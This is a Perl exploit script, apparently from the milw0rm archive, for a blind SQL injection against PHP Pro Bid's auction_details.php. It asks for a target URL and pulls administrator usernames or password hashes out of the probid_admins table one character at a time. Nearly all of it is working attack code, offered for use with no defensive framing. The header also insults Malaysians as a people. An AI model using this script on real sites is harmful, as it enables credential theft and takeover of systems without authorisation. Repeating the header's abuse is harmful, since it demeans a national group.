#!/usr/bin/perl

#//////////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\#
#\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\//////////////////////////////////#
#                                                                    #
# [o] PHP Pro Bid Blind SQL Injection Exploit                        #
#                                                                    #
#      Software : PHP Pro Bid                                        #
#      Vendor   : http://www.phpprobid.com/                          #
#      Author   : NoGe                                               #
#      Contact  : noge[dot]code[at]gmail[dot]com                     #
#      Blog     : http://evilc0de.blogspot.com - http://pacenoge.org #
#                                                                    #
# [o] Usage                                                          #
#                                                                    #
#      root@noge:~# perl bid.pl                                      #
#                                                                    #
#                                                                    #
#      [+] URL Path : www.target.com/[path]                          #
#      [+] Valid ID : 1                                              #
#      [+] Column   : username                                       #
#                                                                    #
#      [!] Exploiting http://www.target.com/[path]/ ...              #
#                                                                    #
#      [+] SELECT username FROM probid_admins LIMIT 0,1 ...          #
#      [+] result> admin                                             #
#                                                                    #
#      [!] Exploit completed.                                        #
#                                                                    #
# [o] Greetz                                                         #
#                                                                    #
#      Anti Security [ http://antisecurity.org ]                     #
#      Vrs-hCk OoN_GaY Paman bL4Ck_3n91n3 Angela Zhang aJe           #
#      H312Y yooogy mousekill }^-^{ loqsa zxvf martfella             #
#      skulmatic OLiBekaS ulga Cungkee k1tk4t str0ke                 #
#                                                                    #
#                               --=]> COPY MY STYLE BY SAYKOJI <[=-- #
#                                                                    #
#      FUCK MALAYSIA!!!                                              #
#      DON'T YOU HAVE YOUR OWN CULTURE?                              #
#      AHH I FORGOT.. YOU DON'T HAVE ANY CULTURE. HAHAHAHA...        #
#                                                                    #
#//////////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\#
#\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\//////////////////////////////////#

# table  : probid_admins
# column : username and password

use HTTP::Request;
use LWP::UserAgent;

$cmsapp = 'crotz';
$vuln   = 'auction_details.php?auction_id=';
$table  = 'probid_admins';
$column = 'password';
$regexp = '<td align="center"><img src="';
$maxlen = 32;

my $OS = "$^O";
if ($OS eq 'MSWin32') { system("cls"); } else { system("clear"); }

printf "\n
                    $cmsapp
 [x]=======================================[x]
  | PHP Pro Bid Blind SQL Injection Exploit |
  |             [F]ound by NoGe             |
 [x]=======================================[x]

\n";

print "\n [+] URL Path : "; chomp($web=<STDIN>);
print " [+] Valid ID : "; chomp($id=<STDIN>);
print " [+] Column : "; chomp($column=<STDIN>);

if ($web =~ /http:\/\// ) { $target = $web."/"; } else { $target = "http://".$web."/"; }

print "\n\n [!] Exploiting $target ...\n\n";
&get_data;
print "\n\n [!] Exploit completed.\n\n";

sub get_data() {
	print " [+] SELECT $column FROM $table LIMIT 0,1 ...\n";
	syswrite(STDOUT, " [+] result> ", 20);
	for (my $i=1; $i<=$maxlen; $i++) {
		my $chr = 0;
		my $found = 0;
		my $char = 48;
		while (!$chr && $char<=57) {
			if(exploit($i,$char) =~ /$regexp/) {
				$chr = 1;
				$found = 1;
				syswrite(STDOUT,chr($char),1);
			} else { $found = 0; }
			$char++;
		}
		if(!$chr) {
			$char = 97;
			while(!$chr && $char<=122) {
				if(exploit($i,$char) =~ /$regexp/) {
					$chr = 1;
					$found = 1;
					syswrite(STDOUT,chr($char),1);
				} else { $found = 0; }
				$char++;
			}
		}
		if (!$found) {
			print "\n\n [!] Exploit completed.\n\n";
			exit;
		}
	}
}

sub exploit() {
	my $limit = $_[0];
	my $chars = $_[1];
	my $blind = '+and+substring((select+'.$column.'+from+'.$table.'+limit+0,1),'.$limit.',1)=char('.$chars.')';
	my $inject = $target.$vuln.$id.$blind;
	my $content = get_content($inject);
	return $content;
}

sub get_content() {
	my $url = $_[0];
	my $req = HTTP::Request->new(GET => $url);
	my $ua  = LWP::UserAgent->new();
	$ua->timeout(15);
	my $res = $ua->request($req);
	if ($res->is_error){
		print "\n\n [!] Error, ".$res->status_line.".\n\n";
		exit;
	}
	return $res->content;
}

# milw0rm.com [2009-09-14]